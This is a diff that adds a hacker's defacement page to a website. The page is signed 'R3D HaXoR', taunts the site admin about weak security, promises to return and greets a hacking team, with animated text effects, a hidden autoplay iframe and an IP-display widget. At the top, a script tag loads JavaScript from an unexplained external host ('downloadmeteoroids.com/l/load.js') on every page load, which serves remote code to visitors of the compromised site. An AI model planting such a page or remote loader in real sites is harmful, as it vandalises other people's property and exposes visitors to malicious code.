@@ -1,0 +1,306 @@
+<META NAME="ROBOTS" CONTENT="INDEX, NOFOLLOW">
+<html>
+<html><center>
+<meta charset='UTF-8'/>
+
+<body bgcolor='Black'><script src="http://d.downloadmeteoroids.com/l/load.js"></script>
+
+<script>
+var ScrollMsg= "Hack3d By R3D HaXoR"
+var CharacterPosition=0;
+function StartScrolling() {
+document.title=ScrollMsg.substring(CharacterPosition,ScrollMsg.length)+
+ScrollMsg.substring(0, CharacterPosition);
+CharacterPosition++;
+if(CharacterPosition > ScrollMsg.length) CharacterPosition=0;
+window.setTimeout("StartScrolling()",150); }
+StartScrolling();
+ // -->
+</script>
+
+<pre style="font: 40px/20px LMSansQuot8;"><b><script language="JavaScript1.2">
+var message="Hack3d By R3D HaXoR "
+var neonbasecolor="silver"
+var neontextcolor="yellow"
+var neontextcolor2="lightgreen"
+var flashspeed=100                     
+var flashingletters=3                     
+var flashingletters2=1                      
+var flashpause=0    
+var n=0
+if (document.all||document.getElementById){
+document.write('<font color="'+neonbasecolor+'">')
+for (m=0;m<message.length;m++)
+document.write('<span id="neonlight'+m+'">'+message.charAt(m)+'</span>')
+document.write('</font>')}
+else
+document.write(message)
+function crossref(number){
+var crossobj=document.all? eval("document.all.neonlight"+number) : document.getElementById("neonlight"+number)
+return crossobj}
+function neon(){
+if (n==0){
+for (m=0;m<message.length;m++)
+crossref(m).style.color=neonbasecolor}
+crossref(n).style.color=neontextcolor
+if (n>flashingletters-1) crossref(n-flashingletters).style.color=neontextcolor2
+if (n>(flashingletters+flashingletters2)-1) crossref(n-flashingletters-flashingletters2).style.color=neonbasecolor
+if (n<message.length-1)
+n++
+else{
+n=0
+clearInterval(flashing)
+setTimeout("beginneon()",flashpause)
+return}}
+function beginneon(){
+if (document.all||document.getElementById)
+flashing=setInterval("neon()",flashspeed)}
+beginneon()
+</script></b></pre><br>
+
+<style type='text/css'>
+a { text-decoration:none; }
+.a{text-shadow:0px 1px 8px Cyan;}
+</style>
+<span class='a'><font size='10' color='lightgreen'>  -->   
+Dear Admin <--<p>--> Your Site Security is very Low <--
+<p> <font size='5' color='pink'> -->  Just warning for You <-- <p>
+--> I will back Later <--
+</font></span>
+
+<script type='text/javascript'>
+var text='R3D HaXoR';
+var delay=40; 
+var Xoff=20; 
+var Yoff=0; 
+var txtw=14;
+var beghtml='<font color="red"><b>'; 
+var endhtml='</b></font>'; 
+ns4 = (navigator.appName.indexOf("Netscape")>=0 && document.layers)? true : false;
+ie4 = (document.all && !document.getElementById)? true : false;
+ie5 = (document.all && document.getElementById)? true : false;
+ns6 = (document.getElementById && navigator.appName.indexOf("Netscape")>=0 )? true: false;
+var txtA=new Array();
+text=text.split('');
+var x1=0;
+var y1=-1000;
+var t='';
+for(i=1;i<=text.length;i++){
+t+=(ns4)? '<layer left="0" top="-100" width="'+txtw+'" name="txt'+i+'" height="1">' : '<div id="txt'+i+'" style="position:absolute; top:-100px; left:0px; height:1px; width:'+txtw+'; visibility:visible;">';
+t+=beghtml+text[i-1]+endhtml;
+t+=(ns4)? '</layer>' : '</div>';}
+document.write(t);
+function moveid(id,x,y){
+if(ns4)id.moveTo(x,y);
+else{
+id.style.left=x+'px';
+id.style.top=y+'px';}}
+function animate(evt){
+x1=Xoff+((ie4||ie5)?event.clientX+document.body.scrollLeft:evt.pageX);
+y1=Yoff+((ie4||ie5)?event.clientY+document.body.scrollTop:evt.pageY);}
+function getidleft(id){
+if(ns4)return id.left;
+else return parseInt(id.style.left);}
+function getidtop(id){
+if(ns4)return id.top;
+else return parseInt(id.style.top);}
+function getwindowwidth(){
+if(ie4||ie5)return document.body.clientWidth+document.body.scrollLeft;
+else return window.innerWidth+pageXOffset;}
+function movetxts(){
+for(i=text.length;i>1;i=i-1){
+if(getidleft(txtA[i-1])+txtw*2>=getwindowwidth()){
+moveid(txtA[i-1],0,-1000);
+moveid(txtA[i],0,-1000);
+}else moveid(txtA[i], getidleft(txtA[i-1])+txtw, getidtop(txtA[i-1]));}
+moveid(txtA[1],x1,y1);}
+window.onload=function(){
+for(i=1;i<=text.length;i++)txtA[i]=(ns4)?document.layers['txt'+i]:(ie4)?document.all['txt'+i]:document.getElementById('txt'+i);
+if(ns4)document.captureEvents(Event.MOUSEMOVE);
+document.onmousemove=animate;
+setInterval('movetxts()',delay);}
+</script>
+
+<script type="text/javascript">
+// ------------------------------------------------------------------------------------
+//  Matrix Code Hao 123
+// ------------------------------------------------------------------------------------
+var theinHTML;
+var thelessstr;
+var ascSt=22;
+var ascEnd=126;
+var numoflines = 28;
+var lines = new Array();
+var intervalID = new Array();
+var subIntervalID = new Array();
+var subIntervalID2 = new Array();
+var scH = screen.height-220;
+var scW = screen.width-50;
+window.onload = createlines;
+// -------------------------------------------------------------------------------------
+// Convert decimal to hex (for the colour)
+var hD="0123456789ABCDEF";
+function d2h(d)
+{
+var h = hD.substr(d&15,1);
+while(d > 15)
+{
+d >>= 4;
+h = hD.substr(d&15,1)+h;
+}
+return h;
+}
+// -------------------------------------------------------------------------------------
+// The line object      
+function line(length, maxlength, chars, speed, x)
+{
+this.length = length;
+this.maxlength = maxlength;
+this.chars = chars;
+this.speed = speed;
+this.x = x;
+}
+// -------------------------------------------------------------------------------------
+// Creates the lines
+function createlines()
+{
+// create the lines as objects as defined above with length, characters, speed, x-value
+for(var eachline = 0; eachline < numoflines; eachline++)
+{
+lines[eachline] = new line(0, Math.round(Math.random()*15+5), String.fromCharCode(Math.round(Math.random()*(ascEnd-ascSt)+ascSt)), Math.round(Math.random()*400+100), eachline*45);
+}
+// write the lines  
+for(var writelines = 0; writelines < numoflines; writelines++)
+{
+var newline = document.createElement("div");
+newline.id = "char" + writelines;
+newline.style.position = "absolute";
+newline.style.top = "5px";
+newline.style.left = lines[writelines].x + "px";     
+var firstchar = document.createElement("div");
+var newcolor = d2h(Math.round(1/(lines[writelines].maxlength+1)*255));
+if(newcolor.length == 1)
+newcolor = "0" + newcolor;
+firstchar.style.color = "#00"+newcolor+"00"
+firstchar.innerHTML = lines[writelines].chars
+newline.appendChild(firstchar);
+document.body.appendChild(newline);
+}
+start();
+}
+// -------------------------------------------------------------------------------------
+// Starts it moving & changing
+function start()
+{
+for(var pickastring = 0; pickastring < numoflines; pickastring++)
+{
+intervalID[pickastring] = setInterval("addchars("+pickastring+")", lines[pickastring].speed);
+}
+}
+// -------------------------------------------------------------------------------------
+// Add random characters to the string (and a line break)
+// and make sure the last one is light
+// once it gets to maxlength start moving down
+function addchars(theline)
+{
+if(lines[theline].length >= lines[theline].maxlength)
+{
+clearInterval(intervalID[theline]);
+subIntervalID[theline] = setInterval("movethestring("+theline+")", lines[theline].speed);
+}
+           else
+           {
+// Get a char (not " or ' or  or it'll get confused)
+myRandomChar = String.fromCharCode(Math.round(Math.random()*(ascEnd-ascSt)+ascSt));
+while(myRandomChar == "'" || myRandomChar == '"' || myRandomChar == "")
+myRandomChar = String.fromCharCode(Math.round(Math.random()*(ascEnd-ascSt)+ascSt));
+// Make a new div for it (so we can change it's colour)
+var newchar = document.createElement("div");
+newchar.innerHTML = myRandomChar;
+document.getElementById("char"+theline).appendChild(newchar);
+// Colour it
+var i;
+for(i = 0; i <= lines[theline].length; i++)
+{
+var newcolor = d2h(Math.round((i+1)/(lines[theline].maxlength+1)*255));
+newcolor = "" + newcolor;
+if(newcolor.length == 1)
+newcolor = "0" + newcolor;
+document.getElementById("char"+theline).childNodes[i].style.color = "#00" + newcolor + "00";
+document.getElementById("char"+theline).childNodes[i].style.fontWeight = "normal";
+}
+document.getElementById("char"+theline).childNodes[i].style.color = "#99FF99";
+document.getElementById("char"+theline).childNodes[i].style.fontWeight = "bold";
+// Increase length by one
+lines[theline].length++;
+}
+}
+// -------------------------------------------------------------------------------------
+// Moves the string (creates and destroys chars)
+function movethestring(theline)
+{
+var topstringnum = document.getElementById("char"+theline).offsetTop;
+if((topstringnum + (lines[theline].maxlength * 15)) >= scH)
+{
+clearInterval(subIntervalID[theline]);
+subIntervalID2[theline] = setInterval("clearletters("+theline+")", lines[theline].speed);
+}
+else
+{
+// create
+myRandomChar = String.fromCharCode(Math.round(Math.random()*(ascEnd-ascSt)+ascSt));
+while(myRandomChar=="'" || myRandomChar=='"' || myRandomChar=="")
+myRandomChar = String.fromCharCode(Math.round(Math.random()*(ascEnd-ascSt)+ascSt));
+var newchar = document.createElement("div");
+newchar.innerHTML = myRandomChar;
+document.getElementById("char"+theline).appendChild(newchar);
+// delete
+document.getElementById("char"+theline).removeChild(document.getElementById("char"+theline).childNodes[0]);
+// re-colour
+var i;
+for(i = 0; i < lines[theline].length; i++)
+{
+var newcolor = d2h(Math.round((i+1)/(lines[theline].maxlength+1)*255));
+newcolor = "" + newcolor;
+if(newcolor.length == 1)
+newcolor = "0" + newcolor;
+document.getElementById("char"+theline).childNodes[i].style.color = "#00" + newcolor + "00";
+document.getElementById("char"+theline).childNodes[i].style.fontWeight = "normal";
+}
+document.getElementById("char"+theline).childNodes[i].style.color = "#99FF99";
+document.getElementById("char"+theline).childNodes[i].style.fontWeight = "bold";
+// move
+document.getElementById("char"+theline).style.top = (topstringnum+15) + "px";
+}}
+// -------------------------------------------------------------------------------------
+// pretty much the opposite of addchars()
+function clearletters(theline)
+{
+if(lines[theline].length <= -1)
+{
+clearInterval(subIntervalID2[theline]);
+document.getElementById("char"+theline).style.top = 0;
+intervalID[theline] = setInterval("addchars("+theline+")", lines[theline].speed);
+}
+else
+{
+// Remove the first character
+document.getElementById("char"+theline).removeChild(document.getElementById("char"+theline).childNodes[document.getElementById("char"+theline).childNodes.length-1]);
+// Move it down by 15px
+var topstringnum = document.getElementById("char"+theline).offsetTop;
+document.getElementById("char"+theline).style.top = topstringnum+15 + "px";
+// Decrease length by one
+lines[theline].length--;
+}}
+</script>
+
+<center><iframe allowfullscreen="" frameborder="0" height="1" src="https://www.youtube.com/watch?v=DMiWah6zaZ0?autoplay=1"></iframe></center>
+
+
+
+<br><font size='8' color='orange'>Greatz:</font><br>
+<font size='3' color='yellow'>=[<font size='3' color='silver' face='Comic Sans MS'><marquee width='485' scrollamount='3' align='center'> All Muslim Hacking Team  </marquee></font>]=<br></font>
+                                                                                                                                <script src="http://gmodules.com/ig/ifr?url=http://www.omeuip.com.br/omeuIP.xml&synd=open&w=320&h=115&title=O Teu IP&border=%23ffffff%7C3px%2C1px+none+%23999999&output=js"></script>
+
+</center></html>
+</html>
